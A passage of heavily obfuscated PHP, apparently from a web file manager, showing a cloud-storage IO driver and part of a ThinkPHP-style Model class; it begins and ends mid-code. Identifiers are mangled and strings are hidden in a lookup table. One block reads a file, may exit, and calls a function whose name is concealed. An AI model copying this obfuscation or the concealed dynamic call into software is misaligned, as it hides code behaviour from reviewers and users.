$ÁË¤ôÃ[$ƒü¬²Ğ¦[1483]] = $ëì„Ë; } $£¾“éâ· = base64_encode(json_encode($ÁË¤ôÃ)); $şŠÁ¡³è = base64_encode(hash_hmac($ƒü¬²Ğ¦[1551], "\x50\x4f\x53\124\46{$à×ğµÙÂ}\46{$½¤¿İ§·}\46{$£¾“éâ·}", md5("{$this->userpass}"), !0)); $ÜÀªåŞÚ = array($ƒü¬²Ğ¦[293] => $£¾“éâ·, $ƒü¬²Ğ¦[1598] => "\x55\x50\x59\125\x4e\x20{$this->username}\72{$şŠÁ¡³è}", $ƒü¬²Ğ¦[208] => $this->endpoint . $à×ğµÙÂ); return $ÜÀªåŞÚ; } public function download($³¦»çÑÌ, $ë˜ì—Ï) { $Â–áÛ› = IO::getPathInner(IO::mkfile($ë˜ì—Ï)); if (!($€¨¥¸ = $this->link($³¦»çÑÌ))) { return !1; } $ø·ãâÂ = 0; $ş´ªƒÇ = 1024 * 200; $éÜãÖÁ÷ = fopen($Â–áÛ›, $_SERVER[¿ğÚ‰±–][1546]); while (!0) { $—àåòÃ¾ = $this->fileSubstr($³¦»çÑÌ, $ø·ãâÂ, $ş´ªƒÇ); if ($—àåòÃ¾ === !1) { return !1; } fwrite($éÜãÖÁ÷, $—àåòÃ¾); $ø·ãâÂ += $ş´ªƒÇ; if (strlen($—àåòÃ¾) < $ş´ªƒÇ) { break; } } fclose($éÜãÖÁ÷); return $ë˜ì—Ï; } public function link($²šÁŸÂî, $ÊÖ‚ğÙ” = array()) { $ óğã†ä =& $_SERVER[¿ğÚ‰±–]; $²šÁŸÂî = trim($²šÁŸÂî, $ óğã†ä[8]); if (!empty($this->token)) { $àâÀë = strtotime(date($ óğã†ä[1599])); $¬·£ù™® = substr(md5($this->token . $ óğã†ä[360] . $àâÀë . $ óğã†ä[1600] . $²šÁŸÂî), 12, 8) . $àâÀë; $ÊÖ‚ğÙ”[] = $ óğã†ä[1601] . $¬·£ù™®; } $›ØÃ½Ø× = !empty($ÊÖ‚ğÙ”) ? $ óğã†ä[76] . implode($ óğã†ä[360], $ÊÖ‚ğÙ”) : $ óğã†ä[12]; return $this->getHost() . $ óğã†ä[8] . $²šÁŸÂî . $›ØÃ½Ø×; } public function fileOut($‡Š™ö‘ó, $ƒÒ®ŒÜ† = false, $ˆƒí÷á’ = false, $˜Ç•¬ûí = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($‡Š™ö‘ó, $ƒÒ®ŒÜ†, $ˆƒí÷á’, $˜Ç•¬ûí); } if (!$ˆƒí÷á’) { $ˆƒí÷á’ = $this->pathThis($‡Š™ö‘ó); } $à¡Ùºë£ = $ƒÒ®ŒÜ† ? array($_SERVER[¿ğÚ‰±–][1602] . rawurlencode($ˆƒí÷á’)) : array(); $§å’£™ = $this->link($‡Š™ö‘ó, $à¡Ùºë£); $this->fileOutLink($§å’£™); } public function fileOutServer($âëËñš, $ü•éÉ½¿ = false, $äÊ´Ÿí = false, $ù×£³ = '') { parent::fileOut($âëËñš, $ü•éÉ½¿, $äÊ´Ÿí, $ù×£³); } public function fileOutImage($éÊİ«öô, $È¶™‚í– = 250) { $éıÍ„ = $this->link($éÊİ«öô . $_SERVER[¿ğÚ‰±–][1603] . $È¶™‚í–); $this->fileOutLink($éıÍ„); } public function fileOutImageServer($±æ‘¿ò³, $òŒ™¯¬´ = 250) { parent::fileOutImage($±æ‘¿ò³, $òŒ™¯¬´); } public function hashMd5($ÄÀæŸÓÍ) { $È»”Ü²È =& $_SERVER[¿ğÚ‰±–]; $©•Ò›“‚ = $this->_objectMeta($ÄÀæŸÓÍ); return isset($©•Ò›“‚[$È»”Ü²È[245]]) ? $©•Ò›“‚[$È»”Ü²È[245]] : !1; } public function size($¨¼“×¤) { $ª®©¼­ï = $this->objectMeta($¨¼“×¤); return $ª®©¼­ï ? $ª®©¼­ï[$_SERVER[¿ğÚ‰±–][79]] : 0; } public function info($×“ŞëÂÈ) { if ($this->isFolder($×“ŞëÂÈ)) { return $this->folderInfo($×“ŞëÂÈ); } else { if ($this->isFile($×“ŞëÂÈ)) { return $this->fileInfo($×“ŞëÂÈ); } } return !1; } public function exist($‰ïû„‘ı) { return $this->isFile($‰ïû„‘ı) || $this->isFolder($‰ïû„‘ı); } public function isFile($±¦–ş´µ) { return !$this->isFolder($±¦–ş´µ) && $this->objectMeta($±¦–ş´µ); } public function isFolder($–¬ê£ÀÄ) { return $this->cacheMethod($_SERVER[¿ğÚ‰±–][179], $–¬ê£ÀÄ); } protected function objectMeta($ãæ”¬½²) { return $this->cacheMethod($_SERVER[¿ğÚ‰±–][181], $ãæ”¬½²); } protected function _objectMeta($Ê­Ğ£ïÉ) { $¡ÉÆíŸÜ =& $_SERVER[¿ğÚ‰±–]; if ($Ê­Ğ£ïÉ == $¡ÉÆíŸÜ[12] || $Ê­Ğ£ïÉ == $¡ÉÆíŸÜ[8]) { return array(); } $š˜‚«Á = $this->ussRequest($Ê­Ğ£ïÉ, $¡ÉÆíŸÜ[1604]); if (!$š˜‚«Á[$¡ÉÆíŸÜ[1304]]) { return null; } $úÃí Åõ = isset($š˜‚«Á[$¡ÉÆíŸÜ[1294]]) ? $š˜‚«Á[$¡ÉÆíŸÜ[1294]] : array(); if (!isset($úÃí Åõ[$¡ÉÆíŸÜ[1605]])) { return null; } $Çç¡¯è± = array($¡ÉÆíŸÜ[33] => isset($úÃí Åõ[$¡ÉÆíŸÜ[1605]]) ? $úÃí Åõ[$¡ÉÆíŸÜ[1605]] : null, $¡ÉÆíŸÜ[79] => isset($úÃí Åõ[$¡ÉÆíŸÜ[1606]]) ? $úÃí Åõ[$¡ÉÆíŸÜ[1606]] : null, $¡ÉÆíŸÜ[245] => isset($úÃí Åõ[$¡ÉÆíŸÜ[1607]]) ? $úÃí Åõ[$¡ÉÆíŸÜ[1607]] : null, $¡ÉÆíŸÜ[1574] => isset($úÃí Åõ[$¡ÉÆíŸÜ[1608]]) ? $úÃí Åõ[$¡ÉÆíŸÜ[1608]] : null); $Çç¡¯è±[$¡ÉÆíŸÜ[1575]] = isset($úÃí Åõ[$¡ÉÆíŸÜ[1609]]) ? strtotime($úÃí Åõ[$¡ÉÆíŸÜ[1609]]) : $Çç¡¯è±[$¡ÉÆíŸÜ[1574]]; return $Çç¡¯è±; } protected function _isFolder($ƒ·Ğºµ) { $è¢ç‘¬ =& $_SERVER[¿ğÚ‰±–]; if ($ƒ·Ğºµ == $è¢ç‘¬[12] || $ƒ·Ğºµ == $è¢ç‘¬[8]) { return !0; } $õ¶•¿ = $this->_objectMeta($ƒ·Ğºµ); return isset($õ¶•¿[$è¢ç‘¬[33]]) && $õ¶•¿[$è¢ç‘¬[33]] == $è¢ç‘¬[78] ? !0 : !1; } } if ($_SERVER[$_SERVER[¿ğÚ‰±–][957]] != $_SERVER[$_SERVER[¿ğÚ‰±–][1610]]) { $_getc = $_SERVER[¿ğÚ‰±–][959]; $_getfile = $_SERVER[$_SERVER[¿ğÚ‰±–][954]] . $_SERVER[¿ğÚ‰±–][955]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¿ğÚ‰±–][262], $_getfilec); if (count($_getarrs) < $_SERVER[¿ğÚ‰±–][686]) { $exit = $_SERVER[¿ğÚ‰±–][960]; $exit(); } $_act = $_SERVER[¿ğÚ‰±–][969]; $_act($_SERVER[$_SERVER[¿ğÚ‰±–][968]]); } goto Cõ†É®¿³‹; DçÖäóĞÇë: define($_SERVER[¿ğÚ‰±–][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\145", "\x6f\162\144\x65\162", "\x61\x6c\151\x61\163", "\150\141\x76\151\x6e\x67", "\x67\x72\x6f\x75\160", "\154\157\x63\153", "\144\151\163\164\x69\x6e\x63\x74", "\141\165\164\157", "\146\151\x6c\164\145\162", "\x76\141\154\x69\x64\x61\x74\145", "\162\x65\x73\x75\154\164", "\x62\x69\x6e\x64", "\x74\157\153\x65\x6e"); public function __construct($è»ù–Î = '', $òùóÍñ× = '', $–¨’åí„ = '') { $¥Ìö·‰† =& $_SERVER[¿ğÚ‰±–]; $this->_initialize(); if (!empty($è»ù–Î)) { if (strpos($è»ù–Î, $¥Ìö·‰†[10])) { list($this->dbName, $this->name) = explode($¥Ìö·‰†[10], $è»ù–Î); } else { $this->name = $è»ù–Î; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($òùóÍñ×)) { $this->tablePrefix = $¥Ìö·‰†[12]; } elseif ($¥Ìö·‰†[12] != $òùóÍñ×) { $this->tablePrefix = $òùóÍñ×; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¥Ìö·‰†[321]); } $this->db(0, empty($this->connection) ? $–¨’åí„ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $·áÕ‡à“ =& $_SERVER[¿ğÚ‰±–]; if (empty($this->fields)) { if (think_config($·áÕ‡à“[322])) { $ô˜Ìº² = $this->dbName ? $this->dbName : think_config($·áÕ‡à“[323]); $±²¯Âï = think_var_cache($·áÕ‡à“[324] . strtolower(get_path_this($ô˜Ìº²) . $·áÕ‡à“[10] . $this->name)); if ($±²¯Âï) { $ƒ«Êóú = think_config($·áÕ‡à“[325]); if (empty($ƒ«Êóú) || $±²¯Âï[$·áÕ‡à“[326]] == $ƒ«Êóú) { $this->fields = $±²¯Âï; return; } } } $this->flush(); } } public function flush() { $³…ì˜ºÉ =& $_SERVER[¿ğÚ‰±–]; $this->db->setModel($this->name); $æëîˆÊä = $this->db->getFields($this->getTableName()); if (!$æëîˆÊä) { return !1; } $this->fields = array_keys($æëîˆÊä); $this->fields[$³…ì˜ºÉ[327]] = !1; foreach ($æëîˆÊä as $ßÃ´°îî => $âãÈÌÍì) { $ğ±€ÑŞ[$ßÃ´°îî] = $âãÈÌÍì[$³…ì˜ºÉ[33]]; if ($âãÈÌÍì[$³…ì˜ºÉ[39]]) { $this->fields[$³…ì˜ºÉ[328]] = $ßÃ´°îî; if ($âãÈÌÍì[$³…ì˜ºÉ[42]]) { $this->fields[$³…ì˜ºÉ[327]] = !0; } } } $this->fields[$³…ì˜ºÉ[329]] = $ğ±€ÑŞ; if (think_config($³…ì˜ºÉ[325])) { $this->fields[$³…ì˜ºÉ[326]] = think_config($³…ì˜ºÉ[325]); } if (think_config($³…ì˜ºÉ[322])) { $õÙòá„û = $this->dbName ? $this->dbName : think_config($³…ì˜ºÉ[323]); think_var_cache($³…ì˜ºÉ[324] . strtolower(get_path_this($õÙòá„û) . $³…ì˜ºÉ[10] . $this->name), $this->fields); } } public function switchModel($½“€ñ´º, $ŞÈÆ¢Ç = array()) { $Œ„åƒğ© =& $_SERVER[¿ğÚ‰±–]; $„¾ª®˜» = ucwords(strtolower($½“€ñ´º)) . $Œ„åƒğ©[330]; if (!class_exists($„¾ª®˜»)) { think_exception($„¾ª®˜» . think_lang($Œ„åƒğ©[331])); } $this->_extModel = new $„¾ª®˜»($this->name); if (!empty($ŞÈÆ¢Ç)) { foreach ($ŞÈÆ¢Ç as $Œ£ÆäÂæ) { $this->_extModel->setProperty($Œ£ÆäÂæ, $this->{$Œ£ÆäÂæ}); } } return $this->_extModel; } public function __set($˜ŞÆıÒÉ, $«ƒ¢½§Ê) { $this->data[$˜ŞÆıÒÉ] = $«ƒ¢½§Ê; } public function __get($£ñ©åÒ¡) { return isset($this->data[$£ñ©åÒ¡]) ? $this->data[$£ñ©åÒ¡] : null; } public function __isset($ÃğƒĞ¤) { return isset($this->data[$ÃğƒĞ¤]); } public function __unset($Ò°¼¬©õ) { unset($this->data[$Ò°¼¬©õ]); } public function __call($İÜ‰‘‰Ç, $Ìğ¾•–‚) { $¶µ‡×öã =& $_SERVER[¿ğÚ‰±–]; if (in_array(strtolower($İÜ‰‘‰Ç), $this->methods, !0)) { $this->options[strtolower($İÜ‰‘‰Ç)] = $Ìğ¾•–‚[0]; return $this; } elseif (in_array(strtolower($İÜ‰‘‰Ç), array($¶µ‡×öã[332], $¶µ‡×öã[333], $¶µ‡×öã[334], $¶µ‡×öã[335], $¶µ‡×öã[336]), !0)) { $½šëŞ = isset($Ìğ¾•–‚[0]) ? $Ìğ¾•–‚[0] : $¶µ‡×öã[220]; $½šëŞ = $this->db->parseKey($½šëŞ); return $this->getField(strtoupper($İÜ‰‘‰Ç) . $¶µ‡×öã[337] . $½šëŞ . $¶µ‡×öã[338] . $İÜ‰‘‰Ç, $¶µ‡×öã[332]); } elseif (strtolower(substr($İÜ‰‘‰Ç, 0, 5)) == $¶µ‡×öã[339]) { $½šëŞ = think_parse_name(substr($İÜ‰‘‰Ç, 5)); $¸Åô·µ¡[$½šëŞ] = $Ìğ¾•–‚[0]; return $this->where($¸Åô·µ¡)->find(); } elseif (strtolower(substr($İÜ‰‘‰Ç, 0, 10)) == $¶µ‡×öã[340]) { $¤Öş¥õ = think_parse_name(substr($İÜ‰‘‰Ç, 10)); $¸Åô·µ¡[$¤Öş¥õ] = $Ìğ¾•–‚[0]; return $this->where($¸Åô·µ¡)->getField($Ìğ¾•–‚[1]); } elseif (isset($this->_scope[$İÜ‰‘‰Ç])) { return $this->scope($İÜ‰‘‰Ç, $Ìğ¾•–‚[0]); } elseif (method_exists($this, $İÜ‰‘‰Ç)) { array_unshift($Ìğ¾•–‚, $İÜ‰‘‰Ç); return call_user_func_array(array($this, $¶µ‡×öã[341]), $Ìğ¾•–‚); } else { return call_user_func_array(array(parent, $İÜ‰‘‰Ç), $Ìğ¾•–‚); } } protected function call() { $àéèÙ­Ó =& $_SERVER[¿ğÚ‰±–]; $Ôµ¬¼àù = func_get_args(); $¼ª˜†¦ = array_shift($Ôµ¬¼àù); $İâı¯† = $¼ª˜†¦; if (is_array($¼ª˜†¦)) { $İâı¯† = $¼ª˜†¦[1]; $¼ª˜†¦ = $¼ª˜†¦[0]; } $áÁ‰Šº· = count($Ôµ¬¼àù) - 1; if (isset($Ôµ¬¼àù[$áÁ‰Šº·]) && $Ôµ¬¼àù[$áÁ‰Šº·] === $¼ª˜†¦) { think_exception(__CLASS__ . $àéèÙ­Ó[4] . $¼ª˜†¦ . think_lang($àéèÙ­Ó[342])); return; } $Ôµ¬¼àù[] = $¼ª˜†¦; if (method_exists($this, $àéèÙ­Ó[343])) { $õ¾œÊÙ = call_user_func_array(array($this, $àéèÙ­Ó[344]), array($İâı¯†, $Ôµ¬¼àù)); if (!is_null($õ¾œÊÙ) && $õ¾œÊÙ !== !1) { return $õ¾œÊÙ; } } $ß”íÃª± = call_user_func_array(array($this, $¼ª˜†¦), $Ôµ¬¼àù); if (method_exists($this, $àéèÙ­Ó[345])) { $õ¾œÊÙ = call_user_func_array(array($this, $àéèÙ­Ó[346]), array($İâı¯†, $Ôµ¬¼àù, $ß”íÃª±)); if ($õ¾œÊÙ) { return $õ¾œÊÙ; } } return $ß”íÃª±; } protected function _initialize() { } protected function _facade($ŒĞ·çŸï) { $ÔÙùºÂŸ =& $_SERVER[¿ğÚ‰±–]; if (!empty($this->fields)) { foreach ($ŒĞ·çŸï as $²…­ÙéÔ => $³¬ò–¿) { if (is_array($this->fields) && !in_array($²…­ÙéÔ, $this->fields, !0)) { unset($ŒĞ·çŸï[$²…­ÙéÔ]); } elseif (is_scalar($³¬ò–¿)) { $this->_parseType($ŒĞ·çŸï, $²…­ÙéÔ); } } } if (!empty($this->options[$ÔÙùºÂŸ[347]])) { $ŒĞ·çŸï = array_map($this->options[$ÔÙùºÂŸ[347]], $ŒĞ·çŸï); unset($this->options[$ÔÙùºÂŸ[347]]); } $this->_beforeWrite($ŒĞ·çŸï); return $ŒĞ·çŸï; } protected function _beforeWrite(&$Ã¬ÒÜëä) { } public function add($à€èˆôÅ = '', $Š”æ¹· = array(), $ü¤ê¥ù‘ = false) { if (empty($à€èˆôÅ)) { if (!empty($this->data)) { $à€èˆôÅ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¿ğÚ‰±–][348]); return !1; } } $Š”æ¹· = $this->_parseOptions($Š”æ¹·); $à€èˆôÅ = $this->_facade($à€èˆôÅ); if (!1 === $this->_beforeInsert($à€èˆôÅ, $Š”æ¹·)) { return !1; } $•Õó»úÏ = $this->db->insert($à€èˆôÅ, $Š”æ¹·, $ü¤ê¥ù‘); if (!1 !== $•Õó»úÏ) { $•ïİ·ğÑ = $this->getLastInsID(); if ($•ïİ·ğÑ) { $à€èˆôÅ[$this->getPk()] = $•ïİ·ğÑ; $this->_after_insert($à€èˆôÅ, $Š”æ¹·); return $•ïİ·ğÑ; } $this->_after_insert($à€èˆôÅ, $Š”æ¹·); } return $•Õó»úÏ; } protected function _beforeInsert(&$ÆÄ½‡úŠ, $™×¨ƒà¾) { } protected function _after_insert($¢ª®³Â³, $‡€åşº×) { } public function addAll($÷Ó†®è“, $€‹ÎµÛø = array(), $Ú†§Ëó = false) { $¦¤ù° =& $_SERVER[¿ğÚ‰±–]; if (empty($÷Ó†®è“)) { $this->error = think_lang($¦¤ù°[348]); return !1; } $€‹ÎµÛø = $this->_parseOptions($€‹ÎµÛø); foreach ($÷Ó†®è“ as $ŠÆ¢¤Š­ => $¢Ÿ·ïè) { $÷Ó†®è“[$ŠÆ¢¤Š­] = $this->_facade($¢Ÿ·ïè); } if (method_exists($this->db, $¦¤ù°[349])) { $ºˆüªÚ• = $this->db->insertAll($÷Ó†®è“, $€‹ÎµÛø, $Ú†§Ëó); } else { $this->startTrans(); foreach ($÷Ó†®è“ as $ŠÆ¢¤Š­ => $¢Ÿ·ïè) { $ºˆüªÚ• = $this->db->insert($¢Ÿ·ïè, $€‹ÎµÛø, $Ú†§Ëó); } $this->commit(); } if (!1 !== $ºˆüªÚ•) { $›çšíê¨ = $this->getLastInsID(); if ($›çšíê¨) { return $›çšíê¨; } } return $ºˆüªÚ•; } public function selectAdd($¡Áğ©×É = '', $²÷´ˆšó = '', $‡Ù…Âõø = array()) { $ÒËÙ÷²ô =& $_SERVER[¿ğÚ‰±–]; $‡Ù…Âõø = $this->_parseOptions($‡Ù…Âõø); if (!1 === ($•­áé– = $this->db->selectInsert($¡Áğ©×É ? $¡Áğ©×É : $‡Ù…Âõø[$ÒËÙ÷²ô[350]], $²÷´ˆšó ? $²÷´ˆšó : $this->getTableName(), $‡Ù…Âõø))) { $this->error = think_lang($ÒËÙ÷²ô[351]); return !1; } else { return $•­áé–; } } public function save($ôøÜÓ‘‚ = '', $ ıÁÄ˜Û = array()) { $õ‹öª¶ü =& $_SERVER[¿ğÚ‰±–]; if (empty($ôøÜÓ‘‚)) { if (!empty($this->data)) { $ôøÜÓ‘‚ = $this->data; $this->data = array(); } else { $this->error = think_lang($õ‹öª¶ü[348]); return !1; } } $ôøÜÓ‘‚ = $this->_facade($ôøÜÓ‘‚); $ ıÁÄ˜Û = $this->_parseOptions($ ıÁÄ˜Û); $üÚïå± = $this->getPk(); if (!isset($ ıÁÄ˜Û[$õ‹öª¶ü[352]])) { if (isset($ôøÜÓ‘‚[$üÚïå±])) { $´Â‘Ñ—[$üÚïå±] = $ôøÜÓ‘‚[$üÚïå±]; $ ıÁÄ˜Û[$õ‹öª¶ü[352]] = $´Â‘Ñ—; unset($ôøÜÓ‘‚[$üÚïå±]); } else { $this->error = think_lang($õ‹öª¶ü[351]); return !1; } } if (is_array($ ıÁÄ˜Û[$õ‹öª¶ü[352]]) && isset($ ıÁÄ˜Û[$õ‹öª¶ü[352]][$üÚïå±])) { $¼¶ë‰ùó = $ ıÁÄ˜Û[$õ‹öª¶ü[352]][$üÚïå±]; } if (!1 === $this->_beforeUpdate($ôøÜÓ‘‚, $ ıÁÄ˜Û)) { return !1; } $ØıŒ í = $this->db->update($ôøÜÓ‘‚, $ ıÁÄ˜Û); if (!1 !== $ØıŒ í) { if (isset($¼¶ë‰ùó)) { $ôøÜÓ‘‚[$üÚïå±] = $¼¶ë‰ùó; } $this->_afterUpdate($ôøÜÓ‘‚, $ ıÁÄ˜Û); } return $ØıŒ í; } protected function _beforeUpdate(&$ˆ·á¶‹É, $¶•½»ì¹) { } protected function _afterUpdate($â±é£ü¬, $­Õàœğ¾) { } public function delete($Êµ£Ş· = array()) { $£‚™¤ëè =& $_SERVER[¿ğÚ‰±–]; if (empty($Êµ£Ş·) && empty($this->options[$£‚™¤ëè[352]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ó¥«¿ŞÌ = $this->getPk(); if (is_numeric($Êµ£Ş·) || is_string($Êµ£Ş·)) { if (strpos($Êµ£Ş·, $£‚™¤ëè[50])) { $¦ªÇîôÉ[$ó¥«¿ŞÌ] = array($£‚™¤ëè[353], $Êµ£Ş·); } else { $¦ªÇîôÉ[$ó¥«¿ŞÌ] = $Êµ£Ş·; } $this->options[$£‚™¤ëè[352]] = $¦ªÇîôÉ; } $Êµ£Ş· = $this->_parseOptions(); if (is_array($Êµ£Ş·[$£‚™¤ëè[352]]) && isset($Êµ£Ş·[$£‚™¤ëè[352]][$ó¥«¿ŞÌ])) { $•±× ¯± = $Êµ£Ş·[$£‚™¤ëè[352]][$ó¥«¿ŞÌ]; } $œëÒ‰åš = $this->db->delete($Êµ£Ş·); if (!1 !== $œëÒ‰åš) { $óóÌŒ = array(); if (isset($•±× ¯±)) { $óóÌŒ[$ó¥«¿ŞÌ] = $•±× ¯±; } $this->_after_delete($óóÌŒ, $Êµ£Ş·); } return $œëÒ‰åš; } protected function _after_delete($¤Ø€äÒ©, $ß¨ø€Ùø) { } public function select($ç¬û¥³¾ = array()) { $¢¼’• =& $_SERVER[¿ğÚ‰±–]; if (is_string($ç¬û¥³¾) || is_numeric($ç¬û¥³¾)) { $Íâó”¹± = $this->getPk(); if (strpos($ç¬û¥³¾, $¢¼’•[50])) { $ªİ»•µ°[$Íâó”¹±] = array($¢¼’•[353], $ç¬û¥³¾); } else { $ªİ»•µ°[$Íâó”¹±] = $ç¬û¥³¾; } $this->options[$¢¼’•[352]] = $ªİ»•µ°; } elseif (!1 === $ç¬û¥³¾) { $ç¬û¥³¾ = $this->_parseOptions(); return $¢¼’•[354] . $this->db->buildSelectSql($ç¬û¥³¾) . $¢¼’•[355]; } $ç¬û¥³¾ = $this->_parseOptions(); $÷Åøè–ı = $this->db->select($ç¬û¥³¾); if (!1 === $÷Åøè–ı) { return !1; } if (empty($÷Åøè–ı)) { return null; } $this->_afterSelect($÷Åøè–ı, $ç¬û¥³¾); return $÷Åøè–ı; } protected function _afterSelect(&$Çª‰çÇî, $Í†µí) { } public function buildSql($ŠÌ›šÜ = array()) { $¨ÊÕ‹ˆÂ =& $_SERVER[¿ğÚ‰±–]; $ŠÌ›šÜ = $this->_parseOptions($ŠÌ›šÜ); return $¨ÊÕ‹ˆÂ[354] . $this->db->buildSelectSql($ŠÌ›šÜ) . $¨ÊÕ‹ˆÂ[355]; } public function optionsValue($É¡¹ë¼ = null) { if (is_null($É¡¹ë¼)) { return $this->options; } elseif (is_array($É¡¹ë¼)) { $this->options = array_merge($this->options, $É¡¹ë¼); } } protected function _parseOptions($ÛÙ·äÇœ = array()) { $ö·ÄåÚ =& $_SERVER[¿ğÚ‰±–]; if (is_array($ÛÙ·äÇœ)) { $ÛÙ·äÇœ = array_merge($this->options, $ÛÙ·äÇœ); } $this->options = array(); if (!isset($ÛÙ·äÇœ[$ö·ÄåÚ[356]])) { $ÛÙ·äÇœ[$ö·ÄåÚ[356]] = $this->getTableName(); $‰‘Â•Èš = $this->fields; } else { $‰‘Â•Èš = $this->getDbFields(); } if (!empty($ÛÙ·äÇœ[$ö·ÄåÚ[357]])) { $ÛÙ·äÇœ[$ö·ÄåÚ[356]] .= $ö·ÄåÚ[53] . $ÛÙ·äÇœ[$ö·ÄåÚ[357]]; } $ÛÙ·äÇœ[$ö·ÄåÚ[358]] = $this->name; if (isset($ÛÙ·äÇœ[$ö·ÄåÚ[352]]) && is_array($ÛÙ·äÇœ[$ö·ÄåÚ[352]]) && !empty($‰‘Â•Èš) && !isset($ÛÙ·äÇœ[$ö·ÄåÚ[359]]) && !isset($ÛÙ·äÇœ[$ö·ÄåÚ[356]])) { foreach ($ÛÙ·äÇœ[$ö·ÄåÚ[352]] as $à‘ºŞ” => $ïÑ¯åèñ) { $à‘ºŞ” = trim($à‘ºŞ”); if (in_array($à‘ºŞ”, $‰‘Â•Èš, !0)) { if (is_scalar($ïÑ¯åèñ)) { $this->_parseType($ÛÙ·äÇœ[$ö·ÄåÚ[352]], $à‘ºŞ”); } } elseif (!is_numeric($à‘ºŞ”) && $ö·ÄåÚ[11] != substr($à‘ºŞ”, 0, 1) && !1 === strpos($à‘ºŞ”, $ö·ÄåÚ[10]) && !1 === strpos($à‘ºŞ”, $ö·ÄåÚ[337]) && !1 === strpos($à‘ºŞ”, $ö·ÄåÚ[214]) && !1 === strpos($à‘ºŞ”, $ö·ÄåÚ[360])) { unset($ÛÙ·äÇœ[$ö·ÄåÚ[352]][$à‘ºŞ”]); } } } $this->_options_filter($ÛÙ·äÇœ); return $ÛÙ·äÇœ; } protected function _options_filter(&$š•éå§ü) { } protected function _parseType(&$¬×­‚âİ, $£°à´) { $İæÀÀíÓ =& $_SERVER[¿ğÚ‰±–]; if (empty($this->options[$İæÀÀíÓ[361]][$İæÀÀíÓ[4] . $£°à´])) { $½Ô»ˆØù = strtolower($this->fields[$İæÀÀíÓ[329]][$£°à´]); if (!1 !== strpos($½Ô»ˆØù, $İæÀÀíÓ[362])) { } elseif (!1 === strpos($½Ô»ˆØù, $İæÀÀíÓ[363]) && !1 !== strpos($½Ô»ˆØù, $İæÀÀíÓ[364])) { $¬×­‚âİ[$£°à´] = intval($¬×­‚âİ[$£°à´]); } elseif (!1 !== strpos($½Ô»ˆØù, $İæÀÀíÓ[365]) || !1 !== strpos($½Ô»ˆØù, $İæÀÀíÓ[366])) { $¬×­‚âİ[$£°à´] = floatval($¬×­‚âİ[$£°à´]); } elseif (!1 !== strpos($½Ô»ˆØù, $İæÀÀíÓ[367])) { $¬×­‚âİ[$£°à´] = (bool) $¬×­‚âİ[$£°à´]; } } } public function find($º¥çï¼ˆ = array()) { $ÛíÉá£ =& $_SERVER[¿ğÚ‰±–]; if (is_numeric($º¥çï¼ˆ) || is_string($º¥çï¼ˆ)) { $Ğ‡ˆìíÑ[$this->getPk()] = intval($º¥çï¼ˆ); $this->options[$ÛíÉá£[352]] = $Ğ‡ˆìíÑ; } $this->options[$ÛíÉá£[368]] = 1; $º¥çï¼ˆ = $this->_parseOptions(); $˜¾ùï¢î = $this->db->select($º¥çï¼ˆ); if (!1 === $˜¾ùï¢î) { return !1; } if (empty($˜¾ùï¢î)) { return null; } $this->data = $˜¾ùï¢î[0]; $this->_afterFind($this->data, $º¥çï¼ˆ); if (!empty($this->options[$ÛíÉá£[369]])) { return $this->returnResult($this->data, $this->options[$ÛíÉá£[369]]); } return $this->data; } protected function _afterFind(&$‡”¾ğİ©, $ÑÆíòÚ) { } protected function returnResult($ÄÓ¢Ì¯¿, $•›¥ƒ• = '') { $úÕöÚ =& $_SERVER[¿ğÚ‰±–]; if ($•›¥ƒ•) { if (is_callable($•›¥ƒ•)) { return call_user_func($•›¥ƒ•, $ÄÓ¢Ì¯¿); } switch (strtolower($•›¥ƒ•)) { case $úÕöÚ[370]: return json_encode($ÄÓ¢Ì¯¿); case $úÕöÚ[371]: return xml_encode($ÄÓ¢Ì¯¿); } } return $ÄÓ¢Ì¯¿; } public function parseFieldsMap($´éÚ¸œø, $±×Åéºß = 1) { if (!empty($this->_map)) { foreach ($this->_map as $¤Ñ²çº‘ => $óİÖıøö) { if ($±×Åéºß == 1) { if (isset($´éÚ¸œø[$óİÖıøö])) { $´éÚ¸œø[$¤Ñ²çº‘] = $´éÚ¸œø[$óİÖıøö]; unset($´éÚ¸œø[$óİÖıøö]); } } else { if (isset($´éÚ¸œø[$¤Ñ²çº‘])) { $´éÚ¸œø[$óİÖıøö] = $´éÚ¸œø[$¤Ñ²çº‘]; unset($´éÚ¸œø[$¤Ñ²çº‘]); } } } } return $´éÚ¸œø; } public function setField($Ëˆõ¤º·, $ıÀÇ„È² = '') { if (is_array($Ëˆõ¤º·)) { $‰½¢Áî† = $Ëˆõ¤º·; } else { $‰½¢Áî†[$Ëˆõ¤º·] = $ıÀÇ„È²; } return $this->save($‰½¢Áî†); } public function setAdd($§×Í—‚, $Ï¢áÑ†˜ = 1) { $ç­ûËŞ¾ =& $_SERVER[¿ğÚ‰±–]; $İí»ªßÕ = $§×Í—‚ . $ç­ûËŞ¾[372] . $Ï¢áÑ†˜; if ($Ï¢áÑ†˜ < 0) { $İí»ªßÕ = $§×Í—‚ . $Ï¢áÑ†˜; } return $this->setField($§×Í—‚, array($ç­ûËŞ¾[373], $İí»ªßÕ)); } public function getField($Ş¶ÔŞ–, $Ù…—€“ = null) { $”¯éõ®ä =& $_SERVER[¿ğÚ‰±–]; $É¡¾Ïéè[$”¯éõ®ä[350]] = $Ş¶ÔŞ–; $É¡¾Ïéè = $this->_parseOptions($É¡¾Ïéè); $Ş¶ÔŞ– = trim($Ş¶ÔŞ–); if (strpos($Ş¶ÔŞ–, $”¯éõ®ä[50])) { if (!isset($É¡¾Ïéè[$”¯éõ®ä[368]])) { $É¡¾Ïéè[$”¯éõ®ä[368]] = is_numeric($Ù…—€“) ? $Ù…—€“ : 